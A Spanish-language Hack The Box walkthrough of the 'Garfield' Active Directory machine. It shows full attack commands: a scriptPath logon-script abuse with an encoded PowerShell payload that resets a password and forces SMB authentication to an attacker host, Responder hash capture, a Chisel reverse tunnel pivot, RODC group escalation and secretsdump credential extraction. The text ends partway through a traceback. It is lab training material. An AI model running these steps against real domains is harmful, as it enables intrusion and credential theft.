# Writeup: Garfield (Hack The Box — Difícil)

Garfield es una máquina **Difícil** de Active Directory sobre **Windows Server 2019** que simula un dominio corporativo (`garfield.htb`) con un **controlador de dominio de solo lectura (RODC)** en una subred interna. La cadena de compromiso parte de credenciales de bajo privilegio (`j.arbuckle`) que, combinadas con un permiso de escritura sobre el atributo `scriptPath` de varios usuarios, permiten un **ataque de script de inicio de sesión** para capturar el hash NetNTLMv2 de `l.wilson`. A partir de ahí se obtiene acceso a `l.wilson_adm` y, mediante el grupo **`RODC Administrators`**, se extraen los secretos del RODC. El hash de la cuenta **`krbtgt_8245`** (el krbtgt específico del RODC) abre la puerta a un **RODC Golden Ticket**, pero la limitación de `secretsdump` para obtener las claves AES obliga a pivotar a **Resource-Based Constrained Delegation (RBCD)** sobre el objeto de equipo `RODC01$`. Finalmente, con un ticket de servicio forjado vía S4U2Proxy se ejecuta código como **`NT AUTHORITY\SYSTEM`** en el RODC.

---

## Fase 1: Reconocimiento

Escaneo de puertos completo:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 10.129.195.195 -oG allPorts
```

**Resultado (extracto):**

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49900/tcp open  unknown          syn-ack ttl 127
50938/tcp open  unknown          syn-ack ttl 127
```

Escaneo de servicios y versiones:

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389,49668,49674,49675,49677,49678,49900,50938 10.129.195.195 -oN targeted
```

**Resultado (extracto):**

```
Host: DC01; OS: Windows
Domain: garfield.htb
Product_Version: 10.0.17763   ← Windows Server 2019
smb2-security-mode:
   3.1.1: Message signing enabled and required
clock-skew: 8h00m05s
```

**Observaciones clave:**

- Dominio `garfield.htb`, DC `DC01.garfield.htb`.
- **Windows Server 2019** (build 17763).
- **SMB signing requerido** → descartamos NTLM relay.
- **WinRM (5985) y RDP (3389)** abiertos.
- **Clock skew de 8 horas** → crítico para Kerberos; habrá que sincronizar la hora antes de cualquier operación con tickets.

---

## Fase 2: Enumeración inicial con credenciales de bajo privilegio

Se proporcionan credenciales de `j.arbuckle:Th1sD4mnC4t!@1978`. Verificamos acceso SMB y enumeramos shares:

```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
```

**Resultado (extracto):**

```
SMB  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB  DC01  Share           Permissions     Remark
SMB  DC01  ADMIN$                          Remote Admin
SMB  DC01  C$                              Default share
SMB  DC01  IPC$            READ            Remote IPC
SMB  DC01  NETLOGON        READ            Logon server share
SMB  DC01  SYSVOL          READ            Logon server share
```

Enumeramos usuarios del dominio:

```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

**Resultado (extracto):**

```
Administrator                 2025-10-03 17:29:26  0
Guest                         <never>              0
krbtgt                        2025-08-13 11:05:26  0
krbtgt_8245                   2025-08-17 11:33:39  0   Key Distribution Center service account for read-only domain controller
j.arbuckle                    2025-09-09 15:50:55  0
l.wilson                      2026-01-27 21:40:33  0
l.wilson_adm                  2026-01-13 14:56:35  0
```

**Hallazgo clave:** la presencia de **`krbtgt_8245`** con la descripción *"Key Distribution Center service account for read-only domain controller"* confirma que el dominio tiene un **RODC** desplegado. Cada RODC tiene su propia cuenta `krbtgt_<RID>` para emitir TGTs locales, separada del `krbtgt` del dominio principal.

Enumeramos los equipos del dominio:

```bash
nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --computers
```

**Resultado:**

```
LDAP  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
LDAP  DC01  [*] Total records returned: 2
LDAP  DC01  DC01$
LDAP  DC01  RODC01$
```

**Hallazgo:** el dominio contiene dos controladores: el DC principal (`DC01$`) y el RODC (`RODC01$`).

---

## Fase 3: Análisis de permisos y modelo de ataque

### 3.1 Permisos de escritura de `j.arbuckle`

Enumeramos los objetos sobre los que `j.arbuckle` tiene permisos de escritura:

```bash
bloodyad --host dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb get writable
```

**Resultado:**

```
distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
permission: CREATE_CHILD
```

Enumeramos los detalles de esos permisos:

```bash
bloodyad --host dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb get writable --detail
```

**Resultado (extracto):**

```
distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD

distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD
```

**Hallazgo crítico:** `j.arbuckle` puede escribir el atributo **`scriptPath`** de `l.wilson` y `l.wilson_adm`. `scriptPath` define el **script de inicio de sesión** que se ejecuta cuando el usuario inicia sesión de forma interactiva en cualquier equipo del dominio. El script se busca en el share **`NETLOGON`** (o `SYSVOL\scripts`), que es de lectura para todos los usuarios autenticados.

### 3.2 Recolección con BloodHound

Se ejecutó `rusthound-ce` para volcar el grafo de AD:

```bash
rusthound-ce --domain garfield.htb -f dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --zip
```

**Resultado (extracto):**

```
[2026-11-07T20:10:18Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 8 users parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 63 groups parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-11-07T20:10:26Z INFO  rusthound_ce::json::maker::common] .//20261107151026_garfield-htb_rusthound-ce.zip created!
```

Los hallazgos principales del análisis del grafo fueron:

- `j.arbuckle` es miembro de **`IT Support`**, que tiene **`WriteProperty` sobre `scriptPath`** para todos los objetos de tipo `User` en el dominio. Esto confirma el permiso encontrado con `bloodyAD`.
- `l.wilson` tiene **`ForceChangePassword`** sobre `l.wilson_adm`.
- `l.wilson_adm` es miembro del grupo **`Tier 1`** y tiene permisos sobre el objeto `RODC01$`, incluyendo **`WriteAccountRestrictions`** (que permite configurar RBCD) y **`ForceChangePassword`**.
- El grupo **`Tier 1`** puede **añadirse a sí mismo** al grupo **`RODC Administrators`** del RODC.

Adicionalmente, se confirmó el permiso de `IT Support` sobre `scriptPath` con `impacket-dacledit`:

```bash
impacket-dacledit -action read -principal "IT SUPPORT" -target j.arbuckle -dc-ip dc01.garfield.htb 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978'
```

**Resultado:**

```
[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-2502726253-3859040611-225969357-3106)
[*]   ACE[24] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : ReadProperty, WriteProperty (0x30)
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Script-Path (bf9679a8-0de6-11d0-a285-00aa003049e2)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : IT Support (S-1-5-21-2502726253-3859040611-225969357-3106)
```

**Hallazgo:** `IT Support` tiene `ReadProperty` y `WriteProperty` sobre el atributo `Script-Path` para todos los objetos de tipo `User`. Esto confirma el vector de ataque.

---

## Fase 4: Ataque de `scriptPath` y captura del hash de `l.wilson`

### 4.1 ¿Por qué funciona el ataque de `scriptPath`?

El atributo **`scriptPath`** es una cadena que indica el nombre del script de inicio de sesión. Cuando un usuario inicia sesión en un equipo Windows unido al dominio, el **cliente Netlogon** del equipo consulta el atributo `scriptPath` del usuario y descarga el script desde el share **`NETLOGON`** del DC (o desde `SYSVOL\<dominio>\scripts`). El script se ejecuta **en el contexto del usuario** que inicia sesión.

Si un atacante puede **escribir `scriptPath`** y **colocar un script malicioso en `SYSVOL\scripts`**, puede ejecutar código arbitrario en la sesión del usuario víctima. En este caso, el script se diseñó para **forzar una autenticación SMB saliente** hacia una máquina controlada por el atacante, lo que permite capturar el **hash NetNTLMv2** del usuario.

### 4.2 Preparación del script malicioso

Se creó un script de PowerShell (`script.ps1`) que:

1. Cambia la contraseña de `l.wilson_adm` a `Password123!` (aprovechando que `l.wilson` tiene `ForceChangePassword` sobre `l.wilson_adm`).
2. Realiza una petición SMB a `\\10.10.17.71\share\$env:username` para forzar la autenticación.

```powershell
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-AdAccountPassword -Identity l.wilson_adm -NewPassword $newpass -reset
dir "\\10.10.17.71\share\$env:username"
```

El script se codificó en **UTF-16LE** y **Base64** para ser ejecutado con `powershell -enc`:

```bash
cat script.ps1 | iconv -t utf-16le | base64 -w0
```

**Resultado:**

```
JABuAGUAdwBwAGEAcwBzACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAnAFAAYQBzAHMAdwBvAHIAZAAxADIAMwAhACcAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlAAoAUwBlAHQALQBBAGQAQQBjAGMAbwB1AG4AdABQAGEAcwBzAHcAbwByAGQAIAAtAEkAZABlAG4AdABpAHQAeQAgAGwALgB3AGkAbABzAG8AbgBfAGEAZABtACAALQBOAGUAdwBQAGEAcwBzAHcAbwByAGQAIAAkAG4AZQB3AHAAYQBzAHMAIAAtAHIAZQBzAGUAdAAKAGQAaQByACAAIgBcAFwAMQAwAC4AMQAwAC4AMQA3AC4ANwAxAFwAcwBoAGEAcgBlAFwAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAiAAoACgA=
```

Posteriormente se creó un archivo `.bat` que invoca PowerShell con el payload codificado:

```cmd
echo 'powershell -enc JABuAGUAdwBwAGEAcwBzACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAnAFAAYQBzAHMAdwBvAHIAZAAxADIAMwAhACcAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlAAoAUwBlAHQALQBBAGQAQQBjAGMAbwB1AG4AdABQAGEAcwBzAHcAbwByAGQAIAAtAEkAZABlAG4AdABpAHQAeQAgAGwALgB3AGkAbABzAG8AbgBfAGEAZABtACAALQBOAGUAdwBQAGEAcwBzAHcAbwByAGQAIAAkAG4AZQB3AHAAYQBzAHMAIAAtAHIAZQBzAGUAdAAKAGQAaQByACAAIgBcAFwAMQAwAC4AMQAwAC4AMQA3AC4ANwAxAFwAcwBoAGEAcgBlAFwAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAiAAoACgA='>script.bat
```

### 4.3 Subida del script a SYSVOL

El share **`SYSVOL`** es legible por todos los usuarios autenticados, pero **solo escribible por administradores**. Sin embargo, en este entorno el permiso de escritura estaba concedido. El archivo `script.bat` se subió a **`SYSVOL\garfield.htb\scripts\`**:

```bash
smbclient //dc01.garfield.htb/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
```

**Resultado:**

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 13 07:04:43 2025
  ..                                  D        0  Wed Aug 13 07:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 07:04:43 2025

smb: \> cd garfield.htb\
smb: \garfield.htb\> dir
  .                                   D        0  Wed Aug 13 07:11:05 2025
  ..                                  D        0  Wed Aug 13 07:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 07:11:05 2025
  Policies                            D        0  Wed Aug 13 07:04:48 2025
  scripts                             D        0  Tue Jan 27 17:13:47 2026

smb: \garfield.htb\scripts\> put script.bat
putting file script.bat as \garfield.htb\scripts\script.bat (0.9 kB/s) (average 0.9 kB/s)
```

### 4.4 Modificación de `scriptPath`

Se modificó el atributo `scriptPath` de `l.wilson` y `l.wilson_adm` para que apunte a `script.bat`:

```bash
bloodyad --host dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb set object l.wilson scriptPath -v script.bat
```

**Resultado:**

```
[+] l.wilson's scriptPath has been updated
```

```bash
bloodyad --host dc01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb set object l.wilson_adm scriptPath -v script.bat
```

**Resultado:**

```
[+] l.wilson_adm's scriptPath has been updated
```

### 4.5 Captura del hash con Responder

Se lanzó **Responder** para envenenar las peticiones NBT-NS/LLMNR y capturar la autenticación SMB:

```bash
sudo responder -I tun0
```

Cuando `l.wilson` inició sesión en algún equipo, el script se ejecutó y forzó la conexión SMB hacia `10.10.17.71`. Responder capturó el hash **NetNTLMv2**:

```
[SMB] NTLMv2-SSP Client   : 10.129.195.195
[SMB] NTLMv2-SSP Username : GARFIELD\l.wilson
[SMB] NTLMv2-SSP Hash     : l.wilson::GARFIELD:46ec3ee41b4114a6:A1E5E0A7D2D62E0500E93C34695A41E8:010100000000000000CB5D63DA6EDD01979A404774FF7B970000000002000800460032005000320001001E00570049004E002D003300360037003500580048004200490034005200510004003400570049004E002D00330036003700350058004800420049003400520051002E0046003200500032002E004C004F00430041004C000300140046003200500032002E004C004F00430041004C000500140046003200500032002E004C004F00430041004C000700080000CB5D63DA6EDD0106000400020000000800300030000000000000000000000000210000D6FA169E1865F6A4BCE4FC1ADA57028145A75E1BFEFEC0543A3015630B1DEC360A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00370031000000000000000000
```

**Análisis:** el script también ejecutó `Set-AdAccountPassword` para `l.wilson_adm`, por lo que, aunque el hash de `l.wilson` no se crackeó, la contraseña de `l.wilson_adm` quedó establecida en `Password123!`. Esto permitió autenticarse directamente como `l.wilson_adm`.

---

## Fase 5: Acceso a `l.wilson_adm` y salto al RODC

### 5.1 Verificación de WinRM

```bash
nxc winrm garfield.htb -u 'l.wilson_adm' -p 'Password123!'
```

**Resultado:**

```
WINRM       10.129.195.195  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb)
WINRM       10.129.195.195  5985   DC01             [+] garfield.htb\l.wilson_adm:Password123! (Pwn3d!)
```

**Hallazgo:** `l.wilson_adm` pertenece a **`Remote Management Users`**, lo que permite una shell WinRM en el DC.

### 5.2 Enumeración del RODC

Desde la shell WinRM en `DC01`, se resuelve el nombre del RODC:

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm> tree /f
```

**Resultado:**

```
Folder PATH listing
Volume serial number is BB12-A7B1
C:.
ÃÄÄÄDesktop
³       user.txt
³
ÃÄÄÄDocuments
ÃÄÄÄDownloads
ÃÄÄÄFavorites
ÃÄÄÄLinks
ÃÄÄÄMusic
ÃÄÄÄPictures
ÃÄÄÄSaved Games
ÀÄÄÄVideos
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\desktop> ping rodc01
```

**Resultado:**

```
Pinging RODC01.garfield.htb [192.168.100.2] with 32 bytes of data:
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
```

**Hallazgo:** el RODC está en **`192.168.100.2`**, una subred **no enrutable directamente** desde la red del atacante. Es necesario un **pivote**.

### 5.3 Pivote con Chisel

Se añadió el RODC a `/etc/hosts`:

```bash
echo "192.168.100.2 rodc01.garfield.htb rodc01" | sudo tee -a /etc/hosts
```

Se desplegó **Chisel** para crear un túnel SOCKS5 a través del DC:

```bash
chisel server -p 8000 --reverse --socks5
```

**Resultado:**

```
2026/11/08 19:27:03 server: Reverse tunnelling enabled
2026/11/08 19:27:03 server: Fingerprint nL9Cw13AJQ+1dHBere7o1tMPtXRR9nsWBNgMxZvZjQc=
2026/11/08 19:27:03 server: Listening on http://0.0.0.0:8000
```

En la shell WinRM del DC se ejecutó el cliente Chisel:

```powershell
.\chisel.exe client 10.10.17.71:8000 R:socks
```

**Resultado:**

```
2026/11/09 00:31:20 client: Connecting to ws://10.10.17.71:8000
2026/11/09 00:31:21 client: Connected (Latency 101.922ms)
```

En el servidor Chisel se observó la sesión:

```
2026/11/08 19:31:19 server: session#1: Client version (1.12.0) differs from server version (1.13.0-0kali1)
2026/11/08 19:31:19 server: session#1: Open (user=- addr=10.129.244.207:57374 remotes=R:127.0.0.1:1080:socks)
2026/11/08 19:31:19 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

**Hallazgo:** se estableció un proxy SOCKS5 en `127.0.0.1:1080` que enruta el tráfico hacia la red interna `192.168.100.0/24`.

### 5.4 Acceso WinRM al RODC vía proxychains

Se accedió por WinRM a través del proxy:

```bash
proxychains evil-winrm -u 'l.wilson_adm' -p 'Password123!' -i rodc01.garfield.htb
```

**Resultado:**

```
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  rodc01.garfield.htb:5985  ...  OK
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami
garfield\l.wilson_adm
```

**Hallazgo:** `l.wilson_adm` puede autenticarse en el RODC. Sus grupos en el RODC incluyen **`Tier 1`**, pero **no** `RODC Administrators` (todavía).

---

## Fase 6: Escalada en el RODC — `RODC Administrators` y extracción de secretos

### 6.1 Unión al grupo `RODC Administrators`

El grupo **`Tier 1`** tiene permiso para **añadirse a sí mismo** al grupo **`RODC Administrators`** del RODC. Desde `DC01`, usando `bloodyAD`:

```bash
bloodyad --host dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -d garfield.htb add groupMember "RODC Administrators" l.wilson_adm
```

**Resultado:**

```
[+] l.wilson_adm added to RODC Administrators
```

**Análisis:** `RODC Administrators` es un grupo **local del RODC** que otorga privilegios administrativos **solo en ese RODC**. No es Domain Admin, pero permite administrar el RODC (incluyendo la extracción de secretos locales).

### 6.2 Nuevos permisos como `RODC Administrator`

Tras un nuevo inicio de sesión en el RODC, `l.wilson_adm` obtiene privilegios elevados. Se verifica con `whoami /all`:

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm> whoami /all
```

**Resultado (extracto):**

```
USER INFORMATION
----------------
User Name             SID
===================== =============================================
garfield\l.wilson_adm S-1-5-21-2502726253-3859040611-225969357-3107

GROUP INFORMATION
-----------------
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
...
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
...
GARFIELD\RODC Administrators               Group            S-1-5-21-2502726253-3859040611-225969357-2101 Mandatory group, Enabled by default, Enabled group
...

PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

También se verificó la pertenencia al grupo de administradores locales:

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm> net localgroup administrators
```

**Resultado:**

```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

**Hallazgo:** `l.wilson_adm` ahora es **Administrador local del RODC**, con privilegios como `SeDebugPrivilege`, `SeBackupPrivilege` y `SeImpersonatePrivilege`.

### 6.3 Permisos adicionales sobre `RODC01$`

Se enumeraron los permisos de `l.wilson_adm` sobre el objeto `RODC01$`:

```bash
bloodyad --host dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -d garfield.htb get writable --detail
```

**Resultado (extracto):**

```
distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msDS-RevealOnDemandGroup: WRITE
msDS-NeverRevealGroup: WRITE
lastLogonTimestamp: WRITE
managedBy: WRITE
...
```

**Hallazgo:** `l.wilson_adm` tiene `WRITE` sobre **`msDS-AllowedToActOnBehalfOfOtherIdentity`**, lo que permite configurar **RBCD**. También puede modificar `msDS-RevealOnDemandGroup` y `msDS-NeverRevealGroup`, que controlan qué contraseñas se replican al RODC.

Se consultó el objeto `RODC01$` para obtener más información:

```bash
bloodyad --host dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -d garfield.htb get object 'rodc01$'
```

**Resultado (extracto):**

```
distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
...
msDS-KrbTgtLink: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
msDS-NeverRevealGroup: CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb; CN=Account Operators,CN=Builtin,DC=garfield,DC=htb; ...
msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
msDS-RevealedUsers: B:96:A000090001000000134FB21E0300000066BB08AAF89CCD47A0E704FEB66E800030400000000000003040000000000000:CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb; ...
```

**Hallazgo:** el RODC tiene vinculada la cuenta `krbtgt_8245` (`msDS-KrbTgtLink`). Los grupos de replicación de contraseñas (`msDS-RevealOnDemandGroup` y `msDS-NeverRevealGroup`) controlan qué cuentas se replican. `l.wilson_adm` puede modificarlos, pero el hash de `krbtgt_8245` ya está replicado (aparece en `msDS-RevealedUsers`).

También se modificó el atributo `managedBy` de `RODC01$` para apuntar a `l.wilson_adm` (aunque no es estrictamente necesario para RBCD):

```bash
bloodyad --host dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!' -d garfield.htb set object 'rodc01$' ManagedBy -v "CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
```

**Resultado:**

```
[+] rodc01$'s managedBy has been updated
```

### 6.4 Extracción de secretos con `secretsdump`

Se ejecutó `impacket-secretsdump` a través del proxy para volcar SAM, LSA Secrets y el `NTDS.dit` del RODC:

```bash
proxychains impacket-secretsdump 'l.wilson_adm:Password123!@rodc01.garfield.htb'
```

**Resultado (extracto):**

```
[*] Target system bootKey: 0x0821167a7588e6d2b614897381a821e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:75be66596ddc5654acafd187fe51b960:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
GARFIELD\RODC01$:aes256-cts-hmac-sha1-96:53f207641615eef3b3235d9b2ee9dfa47dcec7c05d46393958031eaee42eda22
GARFIELD\RODC01$:aes128-cts-hmac-sha1-96:52432a8bdb5b11e64f3c9f53ef712b50
GARFIELD\RODC01$:des-cbc-md5:d0bcec45048f896b
GARFIELD\RODC01$:aad3b435b51404eeaad3b435b51404ee:0a3f810964bb5e1f0e52245f73700172:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xaadd93a8b30c0fc22ad839d8bfdc9ee6ec158197
dpapi_userkey:0x2d4b8deaff672885e9e9ebf80897999fb759a12c
[*] NL$KM
 0000   6B 11 7A B9 57 D2 77 C0  42 65 19 7C 78 9B 01 E6   k.z.W.w.Be.|x...
 0010   64 DA 6F DF DC B9 B0 E9  A1 C2 6C 0B FA 72 24 7B   d.o.......l..r${
 0020   A3 A6 C7 A3 05 1A 29 42  06 AF 0B 84 82 F0 F3 B8   ......)B........
 0030   21 71 96 71 1A 8D 6F 73  B0 DD E8 B0 7E FE 22 1F   !q.q..os....~.".
NL$KM:6b117ab957d277c04265197c789b01e664da6fdfdcb9b0e9a1c26c0bfa72247ba3a6c7a3051a294206af0b8482f0f3b8217196711a8d6f73b0dde8b07efe221f
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  rodc01.garfield.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  rodc01.garfield.htb:49667  ...  OK
[-] Unknown DCE RPC fault status code: 00000057
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
Exception ignored while calling deallocator <function Registry.__del__ at 0x7ff54a4089e0>:
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 172, in __del__
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 169, in close
  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 410, in close
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1364, in close
